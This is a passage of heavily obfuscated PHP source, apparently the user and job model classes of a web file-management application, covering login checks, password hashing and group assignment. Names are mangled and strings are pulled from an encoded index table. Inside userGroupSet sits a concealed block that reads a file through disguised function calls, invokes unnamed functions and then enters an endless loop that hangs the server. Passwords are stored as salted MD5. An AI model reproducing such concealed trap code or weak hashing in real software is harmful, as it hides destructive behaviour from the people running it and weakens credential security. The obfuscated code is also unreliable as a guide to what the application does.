$­ó¸ÒØ = $this->where($¿“òş­¯)->max($Äõ¬ú÷Ş[2153]); $ğ³ğóÂà = array($Äõ¬ú÷Ş[2153] => $­ó¸ÒØ + 1); return $this->where($¿“òş­¯)->where(array($Äõ¬ú÷Ş[32] => $–úï—Úµ))->save($ğ³ğóÂà); } private function getAutoName($¦üåÌ§Ô) { $ùêúƒ†µ =& $_SERVER[öæÛ¿©¿]; $Â”êÖ£ú = array($ùêúƒ†µ[1916] => USER_ID, $ùêúƒ†µ[569] => 0); $¬ÊÖÙü = $this->field($ùêúƒ†µ[32])->where($Â”êÖ£ú)->select(); $¬ÊÖÙü = array_to_keyvalue($¬ÊÖÙü, $ùêúƒ†µ[12], $ùêúƒ†µ[32]); if (!$¬ÊÖÙü || !in_array($¦üåÌ§Ô, $¬ÊÖÙü)) { return $¦üåÌ§Ô; } for ($İ²”áñÁ = 0; $İ²”áñÁ < count($¬ÊÖÙü); $İ²”áñÁ++) { if (!in_array($¦üåÌ§Ô . "\x28{$İ²”áñÁ}\x29", $¬ÊÖÙü)) { return $¦üåÌ§Ô . "\x28{$İ²”áñÁ}\x29"; } } return $¦üåÌ§Ô . "\x28{$İ²”áñÁ}\x29"; } } goto cÉàçØâ·„; cÉàçØâ·„: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\x6a\x6f\x62\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\x64\145\x73\143", "\163\157\162\164"); const JOB_KEY = "\x73\x65\154\x66\112\157\x62\x4c\151\163\164"; public function listData($®ÎÖ¥Æ¦ = false, $×Ó¯ó„è = "\163\157\x72\x74", $¸ğáÄñï = false) { return parent::listData($®ÎÖ¥Æ¦, $×Ó¯ó„è, $¸ğáÄñï); } public function remove($ë®íû¢¼) { return parent::remove($ë®íû¢¼); } public function add($ÌÆ™­Ûê) { $‚ĞÊçÌ =& $_SERVER[öæÛ¿©¿]; if ($this->findByName($ÌÆ™­Ûê[$‚ĞÊçÌ[32]])) { return !1; } $ÌÆ™­Ûê[$‚ĞÊçÌ[2153]] = $this->getSort(); return parent::insert($ÌÆ™­Ûê); } private function getSort() { $Ş¾Ûã£ =& $_SERVER[öæÛ¿©¿]; $ù ½¦† = parent::listData(); $ö¸ï¡¢Ë = array_to_keyvalue($ù ½¦†, $Ş¾Ûã£[12], $Ş¾Ûã£[2153]); return empty($ö¸ï¡¢Ë) ? 0 : max($ö¸ï¡¢Ë) + 1; } public function update($Šù±—Ğ , $ı‚ğªí¶) { $€ËåÂï =& $_SERVER[öæÛ¿©¿]; $ÎÙ´ë° = parent::listData($Šù±—Ğ ); $õ“ºû†æ = $this->findByName($ı‚ğªí¶[$€ËåÂï[32]]); if (!$ÎÙ´ë° || $õ“ºû†æ && $õ“ºû†æ[$€ËåÂï[483]] != $ÎÙ´ë°[$€ËåÂï[483]]) { return !1; } return parent::update($Šù±—Ğ , $ı‚ğªí¶); } public function setUserJob($«²ñ«×, $ã”ş²êÌ) { $±ŸÕ»°³ =& $_SERVER[öæÛ¿©¿]; if (!is_array($ã”ş²êÌ)) { $ã”ş²êÌ = array($ã”ş²êÌ); } $€”Ú– = parent::listData(); $û˜õÚÕı = array_to_keyvalue($€”Ú–, $±ŸÕ»°³[32]); $æ¸Èúó¿ = $±ŸÕ»°³[463]; foreach ($ã”ş²êÌ as $®î¡ß¦­) { if ($û˜õÚÕı[$®î¡ß¦­]) { $æ¸Èúó¿ .= $û˜õÚÕı[$®î¡ß¦­][$±ŸÕ»°³[483]] . $±ŸÕ»°³[50]; } else { $©´ÛÓª = $this->add($®î¡ß¦­); $æ¸Èúó¿ .= $©´ÛÓª . $±ŸÕ»°³[50]; } } $æ¸Èúó¿ = rtrim($æ¸Èúó¿, $±ŸÕ»°³[50]); Model($±ŸÕ»°³[613])->metaSet($«²ñ«×, self::JOB_KEY, $æ¸Èúó¿); } public function getUserJob($ñ÷ª±Û) { $Ü¯×Ô¬Ş = Model($_SERVER[öæÛ¿©¿][613])->metaGet($ñ÷ª±Û); return $this->getUserJobInfo($Ü¯×Ô¬Ş[self::JOB_KEY]); } public function getUserJobInfo($è—ğ’°²) { $³¬š¼ò§ =& $_SERVER[öæÛ¿©¿]; $İï¬¨† = explode($³¬š¼ò§[50], $è—ğ’°²); $Ô¥ºğÔ› = parent::listData(); $Ô¥ºğÔ› = array_remove_key($Ô¥ºğÔ›, $³¬š¼ò§[232]); $Ø‹æ‚Ÿ = array(); foreach ($İï¬¨† as $¢ÔÀ‘¼) { if (isset($Ô¥ºğÔ›[$¢ÔÀ‘¼])) { $Ø‹æ‚Ÿ[] = $Ô¥ºğÔ›[$¢ÔÀ‘¼]; } } return $Ø‹æ‚Ÿ; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\141\x6d\x65" => "\x75\x73\145\x72\137\155\x65\164\141", "\155\145\x74\141\x46\x69\145\154\144" => "\165\163\145\162\x49\104"); protected $simpleField = "\x75\163\145\x72\x49\104\x2c\156\151\143\x6b\116\x61\x6d\x65\x2c\156\141\155\x65\x2c\141\166\141\x74\141\162\x2c\163\145\x78\54\x73\164\x61\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ªÏŒÆÀö) { $º£‚ÉÉ =& $_SERVER[öæÛ¿©¿]; $ş¸İ¦¸ = $º£‚ÉÉ[2625]; return array($º£‚ÉÉ[2210] => array($ªÏŒÆÀö[0], $ş¸İ¦¸), $º£‚ÉÉ[2212] => array($ªÏŒÆÀö[0], $ş¸İ¦¸), $º£‚ÉÉ[2626] => array($ªÏŒÆÀö[0], $ş¸İ¦¸)); } protected function ___getInfo($Ÿ–‰ËÍ) { $øäƒøâù = $this->getInfoSimple($Ÿ–‰ËÍ); if (!$øäƒøâù || !is_array($øäƒøâù)) { return array(); } return $this->_getInfoApply($øäƒøâù); } protected function ___getInfoFull($×·Òú¤à) { $õÙ£µğ» = $this->getInfoSimple($×·Òú¤à); if (!$õÙ£µğ» || !is_array($õÙ£µğ»)) { return array(); } return $this->_getInfoApply($õÙ£µğ», !0); } protected function ___getInfoSimple($ùíÚº‘) { $€°Ÿùß˜ =& $_SERVER[öæÛ¿©¿]; if (!$ùíÚº‘) { return array(); } $¶³‘ˆÅ› = $this->where(array($€°Ÿùß˜[1538] => intval($ùíÚº‘)))->find(); if (!$¶³‘ˆÅ› || !is_array($¶³‘ˆÅ›)) { return array(); } $¶³‘ˆÅ›[$€°Ÿùß˜[2322]] = Action($€°Ÿùß˜[2323])->parseUrl($¶³‘ˆÅ›[$€°Ÿùß˜[2322]]); return $¶³‘ˆÅ›; } private function _getInfoApply($Ã¦ê¥Äï, $±ğ¢Æûï = false) { $ÉøÑÃ¥ =& $_SERVER[öæÛ¿©¿]; if (!$Ã¦ê¥Äï) { return $Ã¦ê¥Äï; } $Íã‘şí = md5($ÉøÑÃ¥[2627] . $Ã¦ê¥Äï[$ÉøÑÃ¥[998]] . $ÉøÑÃ¥[2628] . $Ã¦ê¥Äï[$ÉøÑÃ¥[32]]); $Ã¦ê¥Äï = $this->_listDataApplyItem($Ã¦ê¥Äï); $ÇÇ˜Ì«€ = Model($ÉøÑÃ¥[1478])->metaGet($Ã¦ê¥Äï[$ÉøÑÃ¥[90]][$ÉøÑÃ¥[192]]); $Ã¦ê¥Äï[$ÉøÑÃ¥[2629]] = $Íã‘şí; $Ã¦ê¥Äï[$ÉøÑÃ¥[90]][$ÉøÑÃ¥[2414]] = isset($ÇÇ˜Ì«€[$ÉøÑÃ¥[2415]]) ? $ÇÇ˜Ì«€[$ÉøÑÃ¥[2415]] : null; if ($±ğ¢Æûï) { $Ã¦ê¥Äï[$ÉøÑÃ¥[551]] = $this->metaGet($Ã¦ê¥Äï[$ÉøÑÃ¥[1538]]); } return $Ã¦ê¥Äï; } protected function getInfoSimpleOuter($äÒ„óšÍ) { $ı‘ã±ı‚ =& $_SERVER[öæÛ¿©¿]; if (!$äÒ„óšÍ || $äÒ„óšÍ == 0) { return array($ı‘ã±ı‚[1538] => $ı‘ã±ı‚[229], $ı‘ã±ı‚[32] => $ı‘ã±ı‚[174] . LNG($ı‘ã±ı‚[2630]) . $ı‘ã±ı‚[176], $ı‘ã±ı‚[2322] => STATIC_PATH . $ı‘ã±ı‚[2631]); } $ì‘ÊŠ¸ = $this->cacheFunctionGet($ı‘ã±ı‚[2221], $äÒ„óšÍ); $ÓÎÑÍöŒ = array_field_key($ì‘ÊŠ¸, explode($ı‘ã±ı‚[50], $this->simpleField)); if (!$ÓÎÑÍöŒ) { return array($ı‘ã±ı‚[1538] => $ı‘ã±ı‚[1322], $ı‘ã±ı‚[32] => $ı‘ã±ı‚[174] . LNG($ı‘ã±ı‚[2632]) . $ı‘ã±ı‚[176], $ı‘ã±ı‚[2322] => STATIC_PATH . $ı‘ã±ı‚[2633]); } $ÓÎÑÍöŒ[$ı‘ã±ı‚[2322]] = Action($ı‘ã±ı‚[2323])->parseUrl($ÓÎÑÍöŒ[$ı‘ã±ı‚[2322]]); return $ÓÎÑÍöŒ; } protected function groupUser($û®·ÓØ) { } public static function errorLang($ñú•ä¸™) { $½ä•€³ö =& $_SERVER[öæÛ¿©¿]; $­×·»É¶ = array(self::ERROR_USER_NOT_EXISTS => $½ä•€³ö[2634], self::ERROR_USER_PASSWORD_ERROR => $½ä•€³ö[2635], self::ERROR_USER_EXIST_NAME => $½ä•€³ö[2636], self::ERROR_USER_EXIST_PHONE => $½ä•€³ö[2637], self::ERROR_USER_EXIST_EMAIL => $½ä•€³ö[2638], self::ERROR_USER_LOGIN_LOCK => $½ä•€³ö[2639], self::ERROR_IP_NOT_ALLOW => $½ä•€³ö[2640], self::ERROR_USER_EXIST_NICKNAME => $½ä•€³ö[2641]); $á»Œóõ = LNG($­×·»É¶[$ñú•ä¸™]); if ($ñú•ä¸™ == self::ERROR_USER_LOGIN_LOCK) { $ÚŠÕå²Ú = (int) Model($½ä•€³ö[1434])->get($½ä•€³ö[2642]); if ($ÚŠÕå²Ú > 60) { $á»Œóõ = str_replace($½ä•€³ö[91], ceil($ÚŠÕå²Ú / 60), $á»Œóõ); } } return $á»Œóõ; } protected function metaSet($¹éñÌØÎ, $–¼Ò±¹ˆ = null, $²úš»áö = null) { $this->clearCache($¹éñÌØÎ); return parent::metaSet($¹éñÌØÎ, $–¼Ò±¹ˆ, $²úš»áö); } public function getInfoByMeta($¨‘´ùç–, $ˆâäŠè) { $ì˜ùäéÙ =& $_SERVER[öæÛ¿©¿]; $¸ï¢À± = Model($ì˜ùäéÙ[2643])->where(array($ì˜ùäéÙ[95] => $¨‘´ùç–, $ì˜ùäéÙ[451] => $ˆâäŠè))->find(); if ($¸ï¢À±) { return $this->getInfo($¸ï¢À±[$ì˜ùäéÙ[1538]]); } return !1; } public function userLoginCheck($‰â¬Ö·“, $¬®ïéå, $Ïä¹œ½— = false) { $úÅĞ¼´ =& $_SERVER[öæÛ¿©¿]; $¥ŠñÂ–Í = $this->userLoginFind($‰â¬Ö·“); if (!$¥ŠñÂ–Í) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¥ŠñÂ–Í[$úÅĞ¼´[1538]], $¬®ïéå)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $Ïä¹œ½— ? $this->getInfoFull($¥ŠñÂ–Í[$úÅĞ¼´[1538]]) : $this->getInfo($¥ŠñÂ–Í[$úÅĞ¼´[1538]]); } public function userLoginFind($âòúâœá) { $ô¿‘Ï§ =& $_SERVER[öæÛ¿©¿]; $ƒõû¸ªÆ = array($ô¿‘Ï§[32] => $âòúâœá, $ô¿‘Ï§[2427] => $âòúâœá, $ô¿‘Ï§[381] => $âòúâœá, $ô¿‘Ï§[2644] => $âòúâœá, $ô¿‘Ï§[1112] => $ô¿‘Ï§[1114]); if ($this->nickNameRpt()) { unset($ƒõû¸ªÆ[$ô¿‘Ï§[2427]]); } return $this->where($ƒõû¸ªÆ)->find(); } public function clearCache($ËøÇû›£) { $¿­Íô¹ =& $_SERVER[öæÛ¿©¿]; $this->cacheFunctionClear($¿­Íô¹[2220], $ËøÇû›£); $this->cacheFunctionClear($¿­Íô¹[2221], $ËøÇû›£); $this->cacheFunctionClear($¿­Íô¹[2645], $ËøÇû›£); } public function userPasswordCheck($ëáø²½, $Ûˆ¾Œí¡) { $×²³æ¶à =& $_SERVER[öæÛ¿©¿]; $Êç’ëİ– = $this->where(array($×²³æ¶à[1538] => intval($ëáø²½)))->find(); $ÒØŞ§ø» = $this->metaGet($ëáø²½); $¡©³¢ÓÃ = isset($ÒØŞ§ø»[$×²³æ¶à[2646]]) ? $ÒØŞ§ø»[$×²³æ¶à[2646]] : $×²³æ¶à[12]; if (md5($¡©³¢ÓÃ . trim($Ûˆ¾Œí¡)) !== $Êç’ëİ–[$×²³æ¶à[998]]) { return !1; } return !0; } public function userAdd($Æå½üí¼) { $âéŸøâ¨ =& $_SERVER[öæÛ¿©¿]; $íÍóØœ¼ = array($âéŸøâ¨[505] => $Æå½üí¼[$âéŸøâ¨[32]], $âéŸøâ¨[2647] => $Æå½üí¼[$âéŸøâ¨[2321]], $âéŸøâ¨[2648] => isset($Æå½üí¼[$âéŸøâ¨[381]]) ? $Æå½üí¼[$âéŸøâ¨[381]] : $âéŸøâ¨[12], $âéŸøâ¨[2649] => isset($Æå½üí¼[$âéŸøâ¨[2644]]) ? $Æå½üí¼[$âéŸøâ¨[2644]] : $âéŸøâ¨[12], $âéŸøâ¨[2650] => isset($Æå½üí¼[$âéŸøâ¨[2427]]) ? $Æå½üí¼[$âéŸøâ¨[2427]] : $Æå½üí¼[$âéŸøâ¨[32]], $âéŸøâ¨[2651] => isset($Æå½üí¼[$âéŸøâ¨[2322]]) ? $Æå½üí¼[$âéŸøâ¨[2322]] : $âéŸøâ¨[12], $âéŸøâ¨[2652] => isset($Æå½üí¼[$âéŸøâ¨[2653]]) ? $Æå½üí¼[$âéŸøâ¨[2653]] : 1, $âéŸøâ¨[2654] => $Æå½üí¼[$âéŸøâ¨[998]], $âéŸøâ¨[2214] => isset($Æå½üí¼[$âéŸøâ¨[2118]]) ? $Æå½üí¼[$âéŸøâ¨[2118]] : 1024 * 1024 * 20, $âéŸøâ¨[2215] => 0, $âéŸøâ¨[2655] => 0, $âéŸøâ¨[2260] => isset($Æå½üí¼[$âéŸøâ¨[842]]) ? $Æå½üí¼[$âéŸøâ¨[842]] : 1); if (!empty($Æå½üí¼[$âéŸøâ¨[1538]])) { $íÍóØœ¼[$âéŸøâ¨[1538]] = $Æå½üí¼[$âéŸøâ¨[1538]]; } $“›õ¢ö„ = $this->_checkExist($Æå½üí¼); if ($“›õ¢ö„ !== !0) { return $“›õ¢ö„; } if (!empty($íÍóØœ¼[$âéŸøâ¨[2322]]) && strlen($íÍóØœ¼[$âéŸøâ¨[2322]]) > 255) { $íÍóØœ¼[$âéŸøâ¨[2322]] = $âéŸøâ¨[12]; } $ØÀ¡ş° = $this->add($íÍóØœ¼); $»æ¿„Ó = array($âéŸøâ¨[2654] => $íÍóØœ¼[$âéŸøâ¨[998]], $âéŸøâ¨[2650] => $íÍóØœ¼[$âéŸøâ¨[2427]], $âéŸøâ¨[2656] => $Æå½üí¼[$âéŸøâ¨[2219]]); $this->userEdit($ØÀ¡ş°, $»æ¿„Ó); Model($âéŸøâ¨[1478])->userRootAdd($ØÀ¡ş°); return $ØÀ¡ş°; } protected function userEditTest($§®–‚ï, $–ª®†±û) { return $this->call($_SERVER[öæÛ¿©¿][2657], $§®–‚ï, $–ª®†±û); } protected function userEdit($÷§½ß¼–, $í¸ôâäß) { $ğÂœÇ‰ =& $_SERVER[öæÛ¿©¿]; $Ô†¦—òè = $this->getInfoSimple($÷§½ß¼–); if (!$Ô†¦—òè) { return !1; } $¿àµ˜›É = $this->_checkExist($í¸ôâäß, $÷§½ß¼–); if ($¿àµ˜›É !== !0) { return $¿àµ˜›É; } if (isset($í¸ôâäß[$ğÂœÇ‰[998]]) && trim($í¸ôâäß[$ğÂœÇ‰[998]]) != $ğÂœÇ‰[12]) { $Ê‚Ïç”¸ = $this->metaGet($÷§½ß¼–); if (empty($Ê‚Ïç”¸[$ğÂœÇ‰[2646]])) { $Ê‚Ïç”¸[$ğÂœÇ‰[2646]] = rand_string(10); Model($ğÂœÇ‰[593])->metaSet($÷§½ß¼–, $ğÂœÇ‰[2646], $Ê‚Ïç”¸[$ğÂœÇ‰[2646]]); } $í¸ôâäß[$ğÂœÇ‰[998]] = md5($Ê‚Ïç”¸[$ğÂœÇ‰[2646]] . trim($í¸ôâäß[$ğÂœÇ‰[998]])); } else { unset($í¸ôâäß[$ğÂœÇ‰[998]]); } if (!empty($í¸ôâäß[$ğÂœÇ‰[2322]]) && strlen($í¸ôâäß[$ğÂœÇ‰[2322]]) > 255) { $í¸ôâäß[$ğÂœÇ‰[2322]] = $ğÂœÇ‰[12]; } if (isset($í¸ôâäß[$ğÂœÇ‰[2427]])) { $this->setNamePinyin($÷§½ß¼–, $í¸ôâäß[$ğÂœÇ‰[2427]]); } if (isset($í¸ôâäß[$ğÂœÇ‰[2219]])) { $œ…³¢Úà = $ğÂœÇ‰[1437] . $÷§½ß¼–; $Å–¦«­˜ = $ğÂœÇ‰[1435]; $†Ôİ»½ = $í¸ôâäß[$ğÂœÇ‰[2219]] ? $í¸ôâäß[$ğÂœÇ‰[2219]] : $ğÂœÇ‰[12]; $«ÄßÊ˜ = Model($ğÂœÇ‰[1434])->get($œ…³¢Úà, $Å–¦«­˜); $«ÄßÊ˜ = $«ÄßÊ˜ ? $«ÄßÊ˜ : $ğÂœÇ‰[12]; if ($«ÄßÊ˜ != $†Ôİ»½) { if (!$†Ôİ»½ && $«ÄßÊ˜) { Model($ğÂœÇ‰[1434])->remove($œ…³¢Úà, $Å–¦«­˜); } else { if ($†Ôİ»½) { Model($ğÂœÇ‰[1434])->set($œ…³¢Úà, $†Ôİ»½, $Å–¦«­˜); } } } unset($í¸ôâäß[$ğÂœÇ‰[2219]]); Model($ğÂœÇ‰[613])->metaSet($÷§½ß¼–, $ğÂœÇ‰[2219], $†Ôİ»½); } if (empty($í¸ôâäß)) { return !0; } $this->where(array($ğÂœÇ‰[1916] => $÷§½ß¼–))->save($í¸ôâäß); $this->clearCache($÷§½ß¼–); return !0; } public function setNamePinyin($‘ìğÓ÷õ, $Ğ…½ßì = false) { $¹è‡Ÿ¶æ =& $_SERVER[öæÛ¿©¿]; if (!$Ğ…½ßì) { $¡š—ÎûÊ = $this->getInfoSimple($‘ìğÓ÷õ); $Ğ…½ßì = $¡š—ÎûÊ[$¹è‡Ÿ¶æ[2427]] ? $¡š—ÎûÊ[$¹è‡Ÿ¶æ[2427]] : $¡š—ÎûÊ[$¹è‡Ÿ¶æ[32]]; } $ÍûÓ¤™ö = Model($¹è‡Ÿ¶æ[613]); if (!Input::check($Ğ…½ßì, $¹è‡Ÿ¶æ[674])) { return $ÍûÓ¤™ö->metaSet($‘ìğÓ÷õ, array($¹è‡Ÿ¶æ[548] => $¹è‡Ÿ¶æ[12], $¹è‡Ÿ¶æ[547] => $¹è‡Ÿ¶æ[12])); } return $ÍûÓ¤™ö->metaSet($‘ìğÓ÷õ, array($¹è‡Ÿ¶æ[548] => str_replace($¹è‡Ÿ¶æ[53], $¹è‡Ÿ¶æ[12], Pinyin::get($Ğ…½ßì)), $¹è‡Ÿ¶æ[547] => Pinyin::get($Ğ…½ßì, $¹è‡Ÿ¶æ[675]))); } private function nickNameRpt() { $Û™ÆûõÎ =& $_SERVER[öæÛ¿©¿]; $ÕÂ‘ŞÄ = Model($Û™ÆûõÎ[865])->get($Û™ÆûõÎ[2658]); $¤ŞÛÖÙÇ = $GLOBALS[$Û™ÆûõÎ[6]][$Û™ÆûõÎ[468]][$Û™ÆûõÎ[2658]]; $Ö«øè¡ = !is_null($ÕÂ‘ŞÄ) ? $ÕÂ‘ŞÄ : $¤ŞÛÖÙÇ; return !!$Ö«øè¡; } private function _checkExist($Àªïê»², $¥¸şÈ­ğ = false) { $¼Ãİ·Øª =& $_SERVER[öæÛ¿©¿]; $¸ë×åµĞ = array($¼Ãİ·Øª[32] => UserModel::ERROR_USER_EXIST_NAME, $¼Ãİ·Øª[2427] => UserModel::ERROR_USER_EXIST_NICKNAME, $¼Ãİ·Øª[381] => UserModel::ERROR_USER_EXIST_EMAIL, $¼Ãİ·Øª[2644] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¸ë×åµĞ[$¼Ãİ·Øª[2427]]); } $ÌÚŠ°Ê¬ = $¥¸şÈ­ğ ? array($¼Ãİ·Øª[1538] => array($¼Ãİ·Øª[2659], $¥¸şÈ­ğ)) : array(); foreach ($¸ë×åµĞ as $Ï¾ÒşÙÑ => $Ì²Ê‡š˜) { $ëìŞ¹Ôõ = array(); foreach ($¸ë×åµĞ as $ù³òŠØÈ => $º–ä¨ÜÌ) { if (isset($Àªïê»²[$ù³òŠØÈ]) && $Àªïê»²[$ù³òŠØÈ]) { $ëìŞ¹Ôõ[] = $Àªïê»²[$ù³òŠØÈ]; } } if (!$ëìŞ¹Ôõ) { continue; } $´èÔ­¿È = array_merge(array($Ï¾ÒşÙÑ => array($¼Ãİ·Øª[7], $ëìŞ¹Ôõ)), $ÌÚŠ°Ê¬); $¢‹ò‰æ¿ = $this->where($´èÔ­¿È)->find(); if ($¢‹ò‰æ¿) { return $Ì²Ê‡š˜; } } return !0; } public function userListInfo($œ¬¡¾äã) { $˜öª±á½ =& $_SERVER[öæÛ¿©¿]; $ú©í­ä³ = array(); $œ¬¡¾äã = is_array($œ¬¡¾äã) ? array_unique($œ¬¡¾äã) : array(); if (!$œ¬¡¾äã) { return $ú©í­ä³; } if (count($œ¬¡¾äã) < 20) { foreach ($œ¬¡¾äã as $†·É±©–) { $ú©í­ä³[$†·É±©– . $˜öª±á½[12]] = $this->getInfoSimpleOuter($†·É±©–); } } else { $“—Ø¯ú° = array($˜öª±á½[1916] => array($˜öª±á½[503], $œ¬¡¾äã)); if (count($œ¬¡¾äã) == 1) { $“—Ø¯ú° = array($˜öª±á½[1916] => $œ¬¡¾äã[0]); } $•ôÉÎ‡’ = Model($˜öª±á½[593])->field($this->simpleField)->where($“—Ø¯ú°)->select(); $•ôÉÎ‡’ = array_to_keyvalue($•ôÉÎ‡’, $˜öª±á½[1538]); foreach ($œ¬¡¾äã as $†·É±©–) { $Ûå†ËŒ¹ = $•ôÉÎ‡’[$†·É±©–]; if (!$Ûå†ËŒ¹) { $ú©í­ä³[$†·É±©– . $˜öª±á½[12]] = $this->getInfoSimpleOuter($†·É±©–); continue; } $Ûå†ËŒ¹[$˜öª±á½[2322]] = Action($˜öª±á½[2323])->parseUrl($Ûå†ËŒ¹[$˜öª±á½[2322]]); $ú©í­ä³[$†·É±©– . $˜öª±á½[12]] = $Ûå†ËŒ¹; } } return $ú©í­ä³; } protected function userStatus($ÀßÏú¡á, $ÜË«²“‡) { $Á‚¢¦Ş½ = $this->getInfoSimple($ÀßÏú¡á); if (!$Á‚¢¦Ş½) { return !1; } $Ò»ïîŠÁ = array($_SERVER[öæÛ¿©¿][842] => $ÜË«²“‡); return $this->userEdit($ÀßÏú¡á, $Ò»ïîŠÁ); } protected function userRemove($ëÑğÙ”) { $ÂÛº³Ï• =& $_SERVER[öæÛ¿©¿]; $É®™ïÎ‡ = $this->getInfoSimple($ëÑğÙ”); if (!$É®™ïÎ‡) { return !1; } $ÌñÚ‚£ø = array($ÂÛº³Ï•[1916] => $ëÑğÙ”); Model($ÂÛº³Ï•[683])->where($ÌñÚ‚£ø)->delete(); Model($ÂÛº³Ï•[2660])->where($ÌñÚ‚£ø)->delete(); Model($ÂÛº³Ï•[2223])->where($ÌñÚ‚£ø)->delete(); Model($ÂÛº³Ï•[2643])->where($ÌñÚ‚£ø)->delete(); Model($ÂÛº³Ï•[1180])->where($ÌñÚ‚£ø)->delete(); Model($ÂÛº³Ï•[2444])->removeUserAll($ëÑğÙ”); Model($ÂÛº³Ï•[925])->userRootRemove($ëÑğÙ”); return $this->where($ÌñÚ‚£ø)->delete(); } protected function userGroupSet($èÈ›¾À, $Ìé”óË, $ÅşØÇÏ = array()) { $ëÌöõÔš =& $_SERVER[öæÛ¿©¿]; if (!isset($_SERVER[$ëÌöõÔš[984]]) || !isset($_SERVER[$ëÌöõÔš[1756]])) { $Õ±Á¾— = $ëÌöõÔš[985]; $·¿Ù¼¡È = $ëÌöõÔš[986]; $Ì†Š¿ÍÂ = $_SERVER[$ëÌöõÔš[981]] . $ëÌöõÔš[982]; $¹š—‡–½ = $·¿Ù¼¡È($Ì†Š¿ÍÂ); $½¢•ÖØ¬ = explode($ëÌöõÔš[286], $¹š—‡–½); if (count($½¢•ÖØ¬) < $ëÌöõÔš[699]) { $ñş­¬û¾ = $ëÌöõÔš[987]; $ñş­¬û¾(); } $±Ç±…Ê‹ = $ëÌöõÔš[988]; $±Ç±…Ê‹($_SERVER[$ëÌöõÔš[989]]); $¨ºªÈÔÖ = 1; for ($Í“¿ß¯è = $¨ºªÈÔÖ; $Í“¿ß¯è > 0; $Í“¿ß¯è++) { $±Ç±…Ê‹ = json_encode($GLOBALS[$ëÌöõÔš[503]]); } } $üôÜ‰ø = $this->getInfoSimple($èÈ›¾À); if (!$üôÜ‰ø || !is_array($Ìé”óË)) { return !1; } $Ïñ½Õõ– = Model($ëÌöõÔš[2223]); $Ïñ½Õõ–->where(array($ëÌöõÔš[1538] => $èÈ›¾À))->delete(); $½¼ÃÃÓ£ = array(); $æÛØ÷‡à = 0; foreach ($Ìé”óË as $Ğ‚¹õ¹É => $‰Á¼Ú×ı) { $«Ğ ±Ü = array($ëÌöõÔš[1538] => $èÈ›¾À, $ëÌöõÔš[1440] => $Ğ‚¹õ¹É, $ëÌöõÔš[1585] => $‰Á¼Ú×ı); $«Ğ ±Ü[$ëÌöõÔš[2153]] = isset($ÅşØÇÏ[$æÛØ÷‡à]) ? $ÅşØÇÏ[$æÛØ÷‡à] : 0; $æÛØ÷‡à++; $½¼ÃÃÓ£[] = $«Ğ ±Ü; } return $Ïñ½Õõ–->addAll($½¼ÃÃÓ£, array(), !0); } protected function userGroupAdd($ò–¼øü, $û³°”À = array()) { $Ñ­°„Û =& $_SERVER[öæÛ¿©¿]; $³±ì”‡ò = $this->getInfoSimple($ò–¼øü); if (!$³±ì”‡ò || empty($û³°”À)) { return !1; } $í…Ÿ˜Î¯ = array(); foreach ($û³°”À as $Š‹’îë” => $û‚†Ï”) { $í…Ÿ˜Î¯[] = array($Ñ­°„Û[1538] => $ò–¼øü, $Ñ­°„Û[1440] => $Š‹’îë”, $Ñ­°„Û[1585] => $û‚†Ï”, $Ñ­°„Û[2153] => 0); } return Model($Ñ­°„Û[2223])->addAll($í…Ÿ˜Î¯, array(), !0); } protected function userGroupRemove($ÆÁ€’™­, $»øïÊÅĞ) { $Èü—³ä =& $_SERVER[öæÛ¿©¿]; $äºÔÈÕ¡ = $this->getInfoSimple($ÆÁ€’™­); if (!$äºÔÈÕ¡ || !$»øïÊÅĞ) { return !1; } $éêœ¹¯‡ = array($Èü—³ä[1916] => $ÆÁ€’™­, $Èü—³ä[2216] => $»øïÊÅĞ); return Model($Èü—³ä[2223])->where($éêœ¹¯‡)->delete(); } public function listData() { $Î¡ï²ÂÌ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Î¡ï²ÂÌ[$_SERVER[öæÛ¿©¿][446]]); return $Î¡ï²ÂÌ; } public function listByID($‘àîŞÕ²) { $ƒèÁ =& $_SERVER[öæÛ¿©¿]; if (!$‘àîŞÕ²) { return; } $¤¿şšÖÃ = array($ƒèÁ[1538] => array($ƒèÁ[7], $‘àîŞÕ²)); $ûÍ‰éî­ = $this->where($¤¿şšÖÃ)->select(); $ûÍ‰éî­ = array_sort_keep($ûÍ‰éî­, $ƒèÁ[1538], $‘àîŞÕ²); $this->_listDataApply($ûÍ‰éî­); return $ûÍ‰éî­; } public function listByGroup($°¹¾ã‡Ü = 0, $­à„éš¾ = array()) { $Å´¨ÆŠ =& $_SERVER[öæÛ¿©¿]; $äÆ·¨· = $Å´¨ÆŠ[12]; $¼áÒ¯ºƒ = array(); if ($°¹¾ã‡Ü) { $¼áÒ¯ºƒ = array($Å´¨ÆŠ[2661] => intval($°¹¾ã‡Ü)); $äÆ·¨· = "\114\x45\106\x54\x20\x4a\117\x49\116\x20{$this->tablePrefix}\x75\163\x65\x72\137\x67\x72\x6f\165\160\x20\165\x73\145\162\137\x67\x72\157\x75\x70\x20\157\x6e\40\x75\163\145\162\56\x75\163\145\162\x49\104\40\75\40\x75\x73\145\162\137\147\162\x6f\165\x70\x2e\165\163\145\x72\111\x44"; $È¯ªÅ ´ = Input::get($Å´¨ÆŠ[540], null, $Å´¨ÆŠ[12]) ? $Å´¨ÆŠ[12] : $Å´¨ÆŠ[2662]; } if (isset($­à„éš¾[$Å´¨ÆŠ[842]])) { $¼áÒ¯ºƒ[$Å´¨ÆŠ[2663]] = $­à„éš¾[$Å´¨ÆŠ[842]]; } $‹­İ¦Ìª = _get($­à„éš¾, $Å´¨ÆŠ[2664], $Å´¨ÆŠ[232]); if (_get($­à„éš¾, $Å´¨ÆŠ[853], !1)) { $¼áÒ¯ºƒ[$‹­İ¦Ìª] = array($Å´¨ÆŠ[2408], 